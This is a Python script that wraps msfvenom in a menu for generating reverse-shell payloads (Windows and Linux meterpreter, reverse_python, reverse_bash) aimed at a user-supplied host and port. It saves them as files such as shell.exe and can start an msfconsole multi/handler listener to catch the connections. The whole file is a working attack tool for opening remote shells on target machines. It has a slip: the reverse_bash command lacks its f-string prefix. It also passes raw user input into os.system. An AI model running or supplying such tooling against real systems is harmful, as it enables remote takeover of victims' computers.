import os
import sys


# clear terminal function
def clear():
    os.system("clear")


clear()
options = str(input("Choose option (number):\n1. Payload preset\n2. Custom payload\n3. Exit\n> "))

# payload generator
clear()
if options == "1":
    payload_options = str(input("""Choose one of these presets:
1. windows/meterpreter/reverse_tcp
2. linux/x86/meterpreter/reverse_tcp
3. cmd/unix/reverse_python
4. cmd/unix/reverse_bash
5. Exit
> """))
    if payload_options == "1":
        payload = "windows/meterpreter/reverse_tcp"
        clear()
        LHOST = str(input("Host IP to connect to:\n> "))
        clear()
        LPORT = str(input("Port:\n> "))
        clear()
        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > shell.exe")
    elif payload_options == "2":
        payload = "linux/x86/meterpreter/reverse_tcp"
        clear()
        LHOST = str(input("Host IP to connect to:\n> "))
        clear()
        LPORT = str(input("Port:\n> "))
        clear()
        os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf > shell.elf")
    elif payload_options == "3":
        payload = "cmd/unix/reverse_python"
        clear()
        LHOST = str(input("Host IP to connect to:\n> "))
        clear()
        LPORT = str(input("Port:\n> "))
        clear()
        os.system(f"msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={LPORT} -f raw > shell.py")
    elif payload_options == "4":
        payload = "cmd/unix/reverse_bash"
        clear()
        LHOST = str(input("Host IP to connect to:\n> "))
        clear()
        LPORT = str(input("Port:\n> "))
        clear()
        os.system("msfvenom -p cmd/unix/reverse_bash LHOST={LHOST} LPORT={LPORT} -f raw > shell.sh")
    elif payload_options == "5":
        sys.exit()
elif options == "2":
    payload = str(input("Payload to use:\n> "))
    clear()
    LHOST = str(input("Host IP to connect to:\n> "))
    clear()
    LPORT = str(input("Port:\n> "))
    clear()
    use_format = str(input("Use format option (y/n):\n> "))
    if use_format == "y":
        clear()
        file_format = str(input("Output file format (e.g. exe):\n> "))
    clear()
    output = str(input("Output file name (with file name! e.g. payload.exe or mygame.py):\n> "))
    clear()
    if use_format == "y" or use_format == "Y":
        print("Generating payload...")
        os.system(f"msfvenom -p {payload} LHOST={LHOST} LPORT={LPORT} -f {file_format} -o payloads/{output}")
    else:
        print("Generating payload...")
        os.system(f"msfvenom -p {payload} LHOST={LHOST} LPORT={LPORT} -o payloads/{output}")
elif options == "3":
    sys.exit()


# create listener
create_listener = str(input("Do you want to create a listener? (y/n):"))
if create_listener == "y" or create_listener == "Y":
    os.system(f"msfconsole -q -x \'use exploit/multi/handler; set payload {payload}; set LHOST {LHOST}; set LPORT {LPORT}; exploit\'")
else:
    sys.exit()
